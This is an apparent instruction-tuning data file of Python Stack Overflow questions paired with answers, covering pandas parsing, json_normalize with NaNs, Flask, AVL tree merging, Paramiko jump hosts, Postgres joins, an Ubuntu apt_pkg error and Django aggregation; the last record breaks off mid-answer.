{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n When I am accessing my column in a dataframe which is of type list, then I am getting the output as str?<p><a href=\"https:\/\/i.stack.imgur.com\/IYjVV.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/IYjVV.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>When I am accessing 2nd column of 0th row which is of type list, but here I am getting string. How Can I get list as the output?<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/XG3pm.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/XG3pm.png\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>It's been read into your df as a <code>str<\/code> type. To avoid it you may try something along the following lines:<\/p>\n<pre><code>from ast import literal_eval\ndf = pd.read_csv(&quot;filepath.csv&quot;, converters=({&quot;link&quot;: literal_eval}))\n<\/code><\/pre>\n<p>or<\/p>\n<pre><code>df[&quot;link&quot;] = df[&quot;link&quot;].apply(literal_eval)\n<\/code><\/pre>\n<p>They will evaluate your str objects to valid python objects<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Tuple-key dictionary in python: Accessing a whole block of entries<p>I am looking for an efficient python method to utilise a hash table that has two keys:\nE.g.:<\/p>\n<pre><code>(1,5) --&gt; {a}\n(2,3) --&gt; {b,c}\n(2,4) --&gt; {d}\n<\/code><\/pre>\n<p>Further I need to be able to retrieve whole blocks of entries, for example all entries that have &quot;2&quot; at the 0-th position (here: (2,3) as well as (2,4)).\nIn another <a href=\"https:\/\/stackoverflow.com\/questions\/58405269\/how-can-i-sum-values-in-a-dictionary-based-on-just-one-element-of-the-tuple-in-t\/69233502#69233502\">post<\/a> it was suggested to use list comprehension, i.e.:<\/p>\n<pre><code>sum(val for key, val in dict.items() if key[0] == 'B')\n<\/code><\/pre>\n<p>I learned that dictionaries are (probably?) the most efficient way to retrieve a value from an object of key:value-pairs. However, calling only an incomplete tuple-key is a bit different than querying the whole key where I either get a value or nothing. I want to ask if python can still return the values in a time proportional to the number of key:value-pairs that match? Or alternatively, is the tuple-dictionary (plus list comprehension) better than using pandas.df.groupby() (but that would occupy a bit much memory space)?<\/p>","output_text":"<p>The &quot;standard&quot; way would be something like<\/p>\n<pre><code>d = {(randint(1,10),i):&quot;something&quot; for i,x in enumerate(range(200))}\n\ndef byfilter(n,d):\n    return list(filter(lambda x:x==n, d.keys()))\n\nbyfilter(5,d) ##returns a list of tuples where x[0] == 5\n<\/code><\/pre>\n<p>Although in similar situations I often used <code>next()<\/code> to iterate manually, when I didn't need the full list.<\/p>\n<p>However there may be some use cases where we can optimize that. Suppose you need to do a couple or more accesses by key first element, and you know the dict keys are not changing meanwhile. Then you can extract the keys in a list and sort it, and make use of some <code>itertools<\/code> functions, namely <code>dropwhile()<\/code> and <code>takewhile()<\/code>:<\/p>\n<pre><code>ls = [x for x in d.keys()]\nls.sort() ##I do not know why but this seems faster than ls=sorted(d.keys())\n\ndef bysorted(n,ls):\n    return list(takewhile(lambda x: x[0]==n, dropwhile(lambda x: x[0]!=n, ls)))\nbysorted(5,ls) ##returns the same list as above\n<\/code><\/pre>\n<p>This can be up to 10x faster in the best case (<code>i=1<\/code> in my example) and more or less take the same time in the worst case (<code>i=10<\/code>) because we are trimming the number of iterations needed.<\/p>\n<p>Of course you can do the same for accessing keys by <code>x[1]<\/code>, you just need to add a <code>key<\/code> parameter to the <code>sort()<\/code> call<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Query and Extract only ID number for Flask reply<p>I have two tables, Threads for threads and Posts for replies.<\/p>\n<p>I am trying to grab an ID of a Thread so I can store the reply with the right ID in the posts table.<\/p>\n<pre><code>thread_ID = Threads.query.get_or_404(id)\nprint(thread_ID)\n<\/code><\/pre>\n<p>the above will print  <code>&lt;Thread 1&gt;<\/code> and it is of type <code>&lt;class '__main__.Threads'&gt;<\/code><\/p>\n<p>In my reply function I have currently hard coded the number 1 <code>thread_id = 1<\/code> so I can only reply to Threads with the ID 1.<\/p>\n<pre><code>@app.route('\/reply\/&lt;int:id&gt;', methods=['GET', 'POST'])       \ndef reply(id):\n    thread = Threads.query.get_or_404(id)\n    if request.method == 'POST':\n        threadid = Threads.query.get(id)\n        print(type(threadid))\n        #post username\n        post_name = request.form['reply_username']\n        #threadID\n        thread_id = 1\n        #content\n        post_content = request.form['reply_content']\n        if post_content != '' :\n            if post_name == '':\n                \n                #add both\n                new_post = Posts(content=post_content,thread_id=thread_id,)\n                try:\n                    # add content and title to DB\n                    db.session.add(new_post)\n                    db.session.commit()\n                    return redirect('\/')\n                except:\n                    return 'Post could not be added'\n            else:\n                new_post = Posts(content=post_content,username=post_name,thread_id=thread_id)\n                try:\n                    # add content and title to DB\n                    db.session.add(new_post)\n                    db.session.commit()\n                    return redirect('\/')\n                except:\n                    return 'Post could not be added'\n    \n    return render_template('reply.html', allposts=allposts, thread=thread)\n<\/code><\/pre>\n<p>I checked and <code>thread_ID = Threads.query.get_or_404(id)<\/code> will always contain the right number but there is a <code>&quot; &lt;Thread * &gt; &quot;<\/code> wrapped around it, but I only need the number as INT.<\/p>\n<p>I tried converting the variable <code>thread_ID<\/code> to a string and then extracting the Int with regex but I cant get it done, it always ends up being an empty list.<\/p>\n<p>Any advice how I can only get the number out?<\/p>\n<p>Is there something I can add to the query to not return the <code>&lt;Thread &gt;<\/code> and only return the number?<\/p>","output_text":"<p>Solved with <code>thread_id = id<\/code>. No regex etc needed. I was blind sighted and dint realize that <code>&lt;int:id&gt;<\/code> is already passing the <code>id<\/code> that only contains the <code>INT<\/code>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Merge 2 AVL trees with corrupted nodes in one of them<p>Suppose we have 2 AVL trees (with methods <code>insert(key)<\/code> and <code>delete(key)<\/code>), but <strong>in one of them<\/strong> there exist corrupted nodes (the number of corrupted nodes is much less than the total number of nodes in that tree).<\/p>\n<p>We want to merge 2 AVL trees into 1 single AVL tree such that the corrupted nodes are removed (we have the list of keys of corrupted nodes).<\/p>\n<p>The <em>&quot;naive&quot; algorithm<\/em> is (assume tree 1 contains corrupted nodes): For each of the corrupted nodes, delete it from tree 1. Then insert all remaining nodes from tree 1 to tree 2, so the final AVL tree is the &quot;merged&quot; tree we want.<\/p>\n<p><strong>Now the question is coming up with a more efficient way to merge 2 trees, better than the <em>naive algorithm<\/em> above.<\/strong><\/p>\n<p>Anyone has any idea? Thanks for your help!<\/p>","output_text":"<p>A binary search tree can list its nodes in increasing order in linear time O(N). You can organize a merging process where you enumerate the nodes of both trees simultaneously, fetching the nodes in global order (and dropping the corrupt ones).<\/p>\n<p>If you store the sorted elements in an array, it is possible to convert to a new balanced BST in linear time. You make it AVL by just setting all balance factors.<\/p>\n<p>I doubt that it is possible to construct the new tree without first merging to an intermediate array. (Which only needs to be an array of pointers.)<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to json_normalize a column with NaNs<ul>\n<li>This question is specific to columns of data in a <code>pandas.DataFrame<\/code><\/li>\n<li>This question depends on if the values in the columns are <code>str<\/code>, <code>dict<\/code>, or <code>list<\/code> type.<\/li>\n<li>This question addresses dealing with the <code>NaN<\/code> values, when <code>df.dropna().reset_index(drop=True)<\/code> isn't a valid option.<\/li>\n<\/ul>\n<h2>Case 1<\/h2>\n<ul>\n<li>With a column of <code>str<\/code> type, the values in the column must be converted to <code>dict<\/code> type, with <code>ast.literal_eval<\/code>, before using <code>.json_normalize<\/code>.<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>import numpy as np\nimport pandas as pd\nfrom ast import literal_eval\n\ndf = pd.DataFrame({'col_str': ['{&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}', '{&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}', '{&quot;c&quot;: &quot;11&quot;}', np.NaN]})\n\n                            col_str\n0  {&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}\n1              {&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}\n2                       {&quot;c&quot;: &quot;11&quot;}\n3                               NaN\n\ntype(df.iloc[0, 0])\n[out]: str\n\ndf.col_str.apply(literal_eval)\n<\/code><\/pre>\n<p>Error:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>df.col_str.apply(literal_eval) results in ValueError: malformed node or string: nan\n<\/code><\/pre>\n<h2>Case 2<\/h2>\n<ul>\n<li>With a column of <code>dict<\/code> type, use <code>pandas.json_normalize<\/code> to convert keys to column headers and values to rows<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>df = pd.DataFrame({'col_dict': [{&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}, {&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}, {&quot;c&quot;: &quot;11&quot;}, np.NaN]})\n\n                           col_dict\n0  {'a': '46', 'b': '3', 'c': '12'}\n1              {'b': '2', 'c': '7'}\n2                       {'c': '11'}\n3                               NaN\n\ntype(df.iloc[0, 0])\n[out]: dict\n\npd.json_normalize(df.col_dict)\n<\/code><\/pre>\n<p>Error:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>pd.json_normalize(df.col_dict) results in AttributeError: 'float' object has no attribute 'items'\n<\/code><\/pre>\n<h2>Case 3<\/h2>\n<ul>\n<li>In a column of <code>str<\/code> type, with the <code>dict<\/code> inside a <code>list<\/code>.<\/li>\n<li>To normalize the column\n<ul>\n<li>apply <code>literal_eval<\/code>, because explode doesn't work on <code>str<\/code> type<\/li>\n<li>explode the column to separate the <code>dicts<\/code> to separate rows<\/li>\n<li>normalize the column<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>df = pd.DataFrame({'col_str': ['[{&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}, {&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}]', '[{&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}, {&quot;c&quot;: &quot;11&quot;}]', np.nan]})\n\n                                                    col_str\n0  [{&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}, {&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}]\n1                       [{&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}, {&quot;c&quot;: &quot;11&quot;}]\n2                                                       NaN\n\ntype(df.iloc[0, 0])\n[out]: str\n    \ndf.col_str.apply(literal_eval)\n<\/code><\/pre>\n<p>Error:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>df.col_str.apply(literal_eval) results in ValueError: malformed node or string: nan\n<\/code><\/pre>","output_text":"<ul>\n<li>There is always the option to:\n<ul>\n<li><code>df = df.dropna().reset_index(drop=True)<\/code><\/li>\n<li>That's fine for the dummy data here, or when dealing with a dataframe where the other columns don't matter.<\/li>\n<li>Not a great option for dataframes with additional columns that are required.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Tested in <code>python 3.10<\/code>, <code>pandas 1.4.3<\/code><\/strong><\/li>\n<\/ul>\n<h2>Case 1<\/h2>\n<ul>\n<li>Since the column contains <code>str<\/code> types, fillna with <code>'{}'<\/code> (a <code>str<\/code>)<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>import numpy as np\nimport pandas as pd\nfrom ast import literal_eval\n\ndf = pd.DataFrame({'col_str': ['{&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}', '{&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}', '{&quot;c&quot;: &quot;11&quot;}', np.NaN]})\n\n                            col_str\n0  {&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}\n1              {&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}\n2                       {&quot;c&quot;: &quot;11&quot;}\n3                               NaN\n\ntype(df.iloc[0, 0])\n[out]: str\n\n# fillna\ndf.col_str = df.col_str.fillna('{}')\n\n# convert the column to dicts\ndf.col_str = df.col_str.apply(literal_eval)\n\n# use json_normalize\ndf = df.join(pd.json_normalize(df.pop('col_str')))\n\n# display(df)\n     a    b    c\n0   46    3   12\n1  NaN    2    7\n2  NaN  NaN   11\n3  NaN  NaN  NaN\n<\/code><\/pre>\n<h2>Case 2<\/h2>\n<p>As of at least <code>pandas 1.3.4<\/code>, <code>pd.json_normalize(df.col_dict)<\/code> works without issue, at least for this simple example.<\/p>\n<hr \/>\n<ul>\n<li>Since the column contains <code>dict<\/code> types, fillna with <code>{}<\/code> (not a <code>str<\/code>)<\/li>\n<li>This needs to be filled using a dict-comprehension, since <code>fillna({})<\/code> does not work<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>df = pd.DataFrame({'col_dict': [{&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}, {&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}, {&quot;c&quot;: &quot;11&quot;}, np.NaN]})\n\n                           col_dict\n0  {'a': '46', 'b': '3', 'c': '12'}\n1              {'b': '2', 'c': '7'}\n2                       {'c': '11'}\n3                               NaN\n\ntype(df.iloc[0, 0])\n[out]: dict\n    \n# fillna\ndf.col_dict = df.col_dict.fillna({i: {} for i in df.index})\n\n# use json_normalize\ndf = df.join(pd.json_normalize(df.pop('col_dict')))\n\n# display(df)\n     a    b    c\n0   46    3   12\n1  NaN    2    7\n2  NaN  NaN   11\n3  NaN  NaN  NaN\n<\/code><\/pre>\n<h2>Case 3<\/h2>\n<ol>\n<li>Fill the <code>NaNs<\/code> with <code>'[]'<\/code> (a <code>str<\/code>)<\/li>\n<li>Now <code>literal_eval<\/code> will work<\/li>\n<li><code>.explode<\/code> can be used on the column to separate the <code>dict<\/code> values to rows<\/li>\n<li>Now the <code>NaNs<\/code> need to be filled with <code>{}<\/code> (not a <code>str<\/code>)<\/li>\n<li>Then the column can be normalized<\/li>\n<\/ol>\n<ul>\n<li>For the case when the column is <code>lists<\/code> of <code>dicts<\/code>, that aren't <code>str<\/code> type, skip to <code>.explode<\/code>.<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>df = pd.DataFrame({'col_str': ['[{&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}, {&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}]', '[{&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}, {&quot;c&quot;: &quot;11&quot;}]', np.nan]})\n\n                                                    col_str\n0  [{&quot;a&quot;: &quot;46&quot;, &quot;b&quot;: &quot;3&quot;, &quot;c&quot;: &quot;12&quot;}, {&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}]\n1                       [{&quot;b&quot;: &quot;2&quot;, &quot;c&quot;: &quot;7&quot;}, {&quot;c&quot;: &quot;11&quot;}]\n2                                                       NaN\n\ntype(df.iloc[0, 0])\n[out]: str\n    \n# fillna\ndf.col_str = df.col_str.fillna('[]')\n\n# literal_eval\ndf.col_str = df.col_str.apply(literal_eval)\n\n# explode\ndf = df.explode('col_str', ignore_index=True)\n\n# fillna again\ndf.col_str = df.col_str.fillna({i: {} for i in df.index})\n\n# use json_normalize\ndf = df.join(pd.json_normalize(df.pop('col_str')))\n\n# display(df)\n     a    b    c\n0   46    3   12\n1  NaN    2    7\n2  NaN    2    7\n3  NaN  NaN   11\n4  NaN  NaN  NaN\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Explanation of hosts\/IP addresses and ports involved in implementation of jump host (port forwarding) with Paramiko<p>I am trying to set jump host connection with Paramiko.<\/p>\n\n<p>This is settings that I have in <code>~\/.ssh\/config<\/code><\/p>\n\n<pre><code>Host jump.csail.mit.edu\n  GSSAPIAuthentication yes\n  GSSAPIKeyExchange yes\n  VerifyHostKeyDNS yes\nHost *.csail.mit.edu !jump.csail.mit.edu 128.52.* 128.30.* 128.31.*\n  ProxyCommand ssh -W %h:%p jump.csail.mit.edu\n  GSSAPIAuthentication yes\n  GSSAPIDelegateCredentials yes\n  GSSAPIKeyExchange yes\n<\/code><\/pre>\n\n<p>and it works if I connect from a Terminal.<\/p>\n\n<p>I also found <a href=\"https:\/\/gist.github.com\/tintoy\/443c42ea3865680cd624039c4bb46219\" rel=\"nofollow noreferrer\">this code<\/a> for Paramiko jump host connection and I wonder what should I set <code>jumpbox_public_addr<\/code> and <code>jumpbox_private_addr<\/code> based on the above ssh config setting?<\/p>\n\n<pre><code>import os\nimport paramiko\n\nssh_key_filename = os.getenv('HOME') + '\/.ssh\/id_rsa'\n\njumpbox_public_addr = '168.128.52.199'\njumpbox_private_addr = '10.0.5.10'\ntarget_addr = '10.0.5.20'\n\njumpbox=paramiko.SSHClient()\njumpbox.set_missing_host_key_policy(paramiko.AutoAddPolicy())\njumpbox.connect(jumpbox_public_addr, username='root', key_filename=ssh_key_filename)\n\njumpbox_transport = jumpbox.get_transport()\nsrc_addr = (jumpbox_private_addr, 22)\ndest_addr = (target_addr, 22)\njumpbox_channel = jumpbox_transport.open_channel(\"direct-tcpip\", dest_addr, src_addr)\n\ntarget=paramiko.SSHClient()\ntarget.set_missing_host_key_policy(paramiko.AutoAddPolicy())\ntarget.connect(target_addr, username='root', key_filename=ssh_key_filename, sock=jumpbox_channel)\n\nstdin, stdout, stderr = target.exec_command(\"ifconfig\")\nfor line in stdout.read().split(b'\\n'):\n  print(str(line))\n\ntarget.close()\njumpbox.close()\n<\/code><\/pre>\n\n<p>Thank you!<\/p>","output_text":"<p><code>jumpbox_public_addr<\/code> is address of your jump server, what should be the <code>jump.csail.mit.edu<\/code>.<\/p>\n\n<p><code>jumpbox_private_addr<\/code> (<code>src_addr<\/code> parameter of <a href=\"https:\/\/docs.paramiko.org\/en\/stable\/api\/transport.html#paramiko.transport.Transport.open_channel\" rel=\"nofollow noreferrer\"><code>Transport.open_channel<\/code><\/a>) is source address of the connection from <code>jump.csail.mit.edu<\/code> to your destination server. In general you do not care about that (as you do not care about a source address and port of most TCP connections). And it definitely should not be the port 22. The following should tell the server to use the defaults:<\/p>\n\n<pre><code>src_addr = (\"0.0.0.0\", 0)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Postgres\/Python subfield sanity check<p>I am struggling with a sanity check. I have a PostgreSQL database on dbeaver and a table named Album. I am trying to automate a sanity check. In the column ArtistId I have a small click-in window on the right, once I click on it I get a new window with ArtistId and Name. For every distinct ArtistId I wish to check whether the name is the corresponding ArtistId. So far I managed to get the table (Album) in a data-frame but I can not reach the sub-field. Thank you in advance for any help.<\/p>\n<ol>\n<li>Problem 1: I need to access the sub-field (Database window picture).<\/li>\n<li>Problem 2: I need to check for every row of the sub-field whether the artist name is 'Iron Maiden' or the corresponding artist name based on ArtistId that the user provided.<\/li>\n<\/ol>\n<p>My code retrieves the entries in the database.<\/p>\n<pre><code>    def get_entries(artistID):\n        artistID = int(input(&quot;Enter an artist_id from the available in postgresql :&quot;))\n        df = pd.read_sql(&quot;SELECT * FROM Album WHERE ArtistId = %s&quot;,connection, params=(artistID,) )\n        return df\n<\/code><\/pre>\n<p>For problem 1) I found the following code <code>SELECT x.* FROM Artist x WHERE x.ArtistId = 4<\/code> which can give me access to the sub-field.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/wV8dr.png\" rel=\"nofollow noreferrer\">Database<\/a> <a href=\"https:\/\/i.stack.imgur.com\/OovHL.png\" rel=\"nofollow noreferrer\">Database window<\/a> <a href=\"https:\/\/i.stack.imgur.com\/iXmff.png\" rel=\"nofollow noreferrer\">Database er diagram<\/a><\/p>","output_text":"<p>The solution to the Problem 1 was a simple query:<\/p>\n<pre><code>SELECT *\nFROM Album a\nCROSS JOIN Artist b\nWhere a.ArtistId  = b.ArtistId\nAND a.ArtistId = 90\n<\/code><\/pre>\n<p>The solution to the Problem 2 was python line:<\/p>\n<p>#This line returns the rows in my dataframe that are not same to the user_input<\/p>\n<pre><code>df.loc[df.ArtistId != artistID]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n In Ubuntu 20.04.3 sudo su or any other command not working<pre><code>yashm@yashm-Inspiron-15-3567:~$ sudo su\nTraceback (most recent call last):\n  File &quot;\/usr\/lib\/command-not-found&quot;, line 28, in &lt;module&gt;\n    from CommandNotFound import CommandNotFound\n  File &quot;\/usr\/lib\/python3\/dist-packages\/CommandNotFound\/CommandNotFound.py&quot;, line 19, in &lt;module&gt;\n    from CommandNotFound.db.db import SqliteDatabase\n  File &quot;\/usr\/lib\/python3\/dist-packages\/CommandNotFound\/db\/db.py&quot;, line 5, in &lt;module&gt;\n    import apt_pkg\nModuleNotFoundError: No module named 'apt_pkg'\n<\/code><\/pre>","output_text":"<p>i found the fix myself\nas sudo command doesn't work you will have to have synaptic package manager installed before hand\nsearch for python3-apt mark it for complete removal and reinstall it completely everything would be normal again\nrefer :<a href=\"https:\/\/www.datasciencelearner.com\/importerror-no-module-named-apt_pkg-fix\/\" rel=\"nofollow noreferrer\">https:\/\/www.datasciencelearner.com\/importerror-no-module-named-apt_pkg-fix\/<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django multiple annotate with Sum get wrong answer<p>I'm trying to use <code>.annotate()<\/code> with multiple <code>Sum()<\/code> But i got wrong calculations.\nI've read that I should use <code>Subquery<\/code> but I didn't get it done with it maybe I use it in wrong way (because it is first time) or it doesn't solve my issue.<\/p>\n<pre><code>#managers.py\n\nclass DonationQuerySet(QuerySet):\n\n    def completed(self):\n        return self.with_donations_stats().filter(\n            amount__lte=F('total_donation'), deleted_at=None)\n\n    def not_completed(self):\n        return self.with_donations_stats().filter(\n            amount__gt=F('total_donation'), deleted_at=None)\n\n    def with_donations_stats(self):\n        return self.annotate(\n            wallet_donation=Coalesce(Sum('wallet_transaction__amount'), 0),\n            normal_donation=Coalesce(Sum('transactions__amount'), 0),\n            total_donation=F('wallet_donation') + F('normal_donation'))\n\n\nclass DonationManager(Manager):\n    def get_queryset(self):\n        return DonationQuerySet(self.model, using=self._db)\n\n    def completed(self):\n        return self.get_queryset().completed()\n\n    def not_completed(self):\n        return self.get_queryset().not_completed()\n\n    def with_donations_stats(self):\n        return self.get_queryset().with_donations_stats()\n<\/code><\/pre>\n<pre><code>#models.py\n\nclass Transaction(models.Model):\n    def __str__(self):\n        return self.payment_id + ' - ' + self.status\n\n    condition = models.ForeignKey('condition.Condition', related_name='transactions',\n                                  on_delete=models.CASCADE) \n    \n    amount = models.IntegerField(null=False, blank=False)\n\nclass WalletTransaction(AbstractBaseModel):\n    condition = models.ForeignKey(&quot;condition.Condition&quot;, on_delete=models.SET_NULL, related_name='wallet_transaction', null=True)\n    amount = models.PositiveIntegerField()\n\n    def __str__(self):\n        return f&quot;{self.id}&quot;\n\nclass Condition(models.Model):\n    def __str__(self):\n        return str(self.id)  # .zfill(10)\n    STATUS_PUBLISHED = &quot;Published&quot;\n    STATUS_CHOICES = (\n        (STATUS_PUBLISHED, 'Published'),)\n    status = models.CharField(max_length=25, choices=STATUS_CHOICES, db_index=True)\n\n    donations = DonationManager()\n<\/code><\/pre>\n<p>and in my view i was querying for published conditions\nconditions =<\/p>\n<pre><code>Condition.donations.filter(status=Condition.STATUS_PUBLISHED).with_donations_stats().order_by(\n            '-id')\n<\/code><\/pre>\n<p><strong>UPDATE<\/strong>\nthe final query is <code>SELECT &quot;conditions&quot;.&quot;id&quot;, &quot;conditions&quot;.&quot;user_id&quot;, &quot;conditions&quot;.&quot;association_id&quot;, &quot;conditions&quot;.&quot;nid&quot;, &quot;conditions&quot;.&quot;amount&quot;, &quot;conditions&quot;.&quot;donation&quot;, &quot;conditions&quot;.&quot;nid_type&quot;, &quot;conditions&quot;.&quot;first_name&quot;, &quot;conditions&quot;.&quot;father_name&quot;, &quot;conditions&quot;.&quot;last_name&quot;, &quot;conditions&quot;.&quot;nationality&quot;, &quot;conditions&quot;.&quot;gender&quot;, &quot;conditions&quot;.&quot;mobile&quot;, &quot;conditions&quot;.&quot;region&quot;, &quot;conditions&quot;.&quot;city&quot;, &quot;conditions&quot;.&quot;district&quot;, &quot;conditions&quot;.&quot;dob&quot;, &quot;conditions&quot;.&quot;introduction_file&quot;, &quot;conditions&quot;.&quot;disease_validation_file&quot;, &quot;conditions&quot;.&quot;medical_report_file&quot;, &quot;conditions&quot;.&quot;treatment_plan_file&quot;, &quot;conditions&quot;.&quot;cost_file&quot;, &quot;conditions&quot;.&quot;case_report_file&quot;, &quot;conditions&quot;.&quot;invoices_file&quot;, &quot;conditions&quot;.&quot;payment_file&quot;, &quot;conditions&quot;.&quot;generated_pdf_file&quot;, &quot;conditions&quot;.&quot;recovery_report_file&quot;, &quot;conditions&quot;.&quot;report_date&quot;, &quot;conditions&quot;.&quot;issued_place&quot;, &quot;conditions&quot;.&quot;specialization&quot;, &quot;conditions&quot;.&quot;disease_type&quot;, &quot;conditions&quot;.&quot;action_type&quot;, &quot;conditions&quot;.&quot;case_type&quot;, &quot;conditions&quot;.&quot;treatment_entity&quot;, &quot;conditions&quot;.&quot;accommodation_type&quot;, &quot;conditions&quot;.&quot;family_members&quot;, &quot;conditions&quot;.&quot;income_avg&quot;, &quot;conditions&quot;.&quot;medical_evaluation_status&quot;, &quot;conditions&quot;.&quot;researcher_opinion&quot;, &quot;conditions&quot;.&quot;rejection_reason&quot;, &quot;conditions&quot;.&quot;justification&quot;, &quot;conditions&quot;.&quot;insurance_company_name_ar&quot;, &quot;conditions&quot;.&quot;insurance_company_name_en&quot;, &quot;conditions&quot;.&quot;insurance_company_id&quot;, &quot;conditions&quot;.&quot;insurance_beneficiary_number&quot;, &quot;conditions&quot;.&quot;insurance_beneficiary_type&quot;, &quot;conditions&quot;.&quot;insurance_class&quot;, &quot;conditions&quot;.&quot;insurance_expiry&quot;, &quot;conditions&quot;.&quot;insurance_limit&quot;, &quot;conditions&quot;.&quot;insurance_policy&quot;, &quot;conditions&quot;.&quot;status&quot;, &quot;conditions&quot;.&quot;created_at&quot;, &quot;conditions&quot;.&quot;updated_at&quot;, &quot;conditions&quot;.&quot;published_at&quot;, &quot;conditions&quot;.&quot;deleted_at&quot;, &quot;conditions&quot;.&quot;image&quot;, &quot;conditions&quot;.&quot;last_donation_at&quot;, COALESCE((SELECT SUM(U0.&quot;amount&quot;) AS &quot;amount_sum&quot; FROM &quot;wallets_wallettransaction&quot; U0 WHERE U0.&quot;condition_id&quot; = (&quot;conditions&quot;.&quot;id&quot;) GROUP BY U0.&quot;id&quot; ORDER BY U0.&quot;id&quot; DESC  LIMIT 1), 0) AS &quot;wallet_donation&quot;, COALESCE((SELECT SUM(U0.&quot;amount&quot;) AS &quot;amount_sum&quot; FROM &quot;transactions&quot; U0 WHERE U0.&quot;condition_id&quot; = (&quot;conditions&quot;.&quot;id&quot;) GROUP BY U0.&quot;condition_id&quot;  LIMIT 1), 0) AS &quot;normal_donation&quot;, (COALESCE((SELECT SUM(U0.&quot;amount&quot;) AS &quot;amount_sum&quot; FROM &quot;wallets_wallettransaction&quot; U0 WHERE U0.&quot;condition_id&quot; = (&quot;conditions&quot;.&quot;id&quot;) GROUP BY U0.&quot;id&quot; ORDER BY U0.&quot;id&quot; DESC  LIMIT 1), 0) + COALESCE((SELECT SUM(U0.&quot;amount&quot;) AS &quot;amount_sum&quot; FROM &quot;transactions&quot; U0 WHERE U0.&quot;condition_id&quot; = (&quot;conditions&quot;.&quot;id&quot;) GROUP BY U0.&quot;condition_id&quot;  LIMIT 1), 0)) AS &quot;total_donation&quot; FROM &quot;conditions&quot; WHERE &quot;conditions&quot;.&quot;status&quot; = Published ORDER BY &quot;conditions&quot;.&quot;id&quot; DESC<\/code><\/p>\n<p>Note: and I'm using the same annotation in another view resulting the same thing.<\/p>","output_text":"<p>You have stumbled upon the problem that <a href=\"https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/db\/aggregation\/#combining-multiple-aggregations\" rel=\"nofollow noreferrer\">Combining multiple aggregations [Django docs]<\/a> will <a href=\"https:\/\/code.djangoproject.com\/ticket\/10060\" rel=\"nofollow noreferrer\">yield the wrong results<\/a> because joins are used instead of subqueries.<\/p>\n<p>Since to make aggregations over relations Django makes joins and with aggregation on multiple relations there would be multiple joins the results of course are wrong. Therefore we need to annotate using <a href=\"https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/models\/expressions\/#subquery-expressions\" rel=\"nofollow 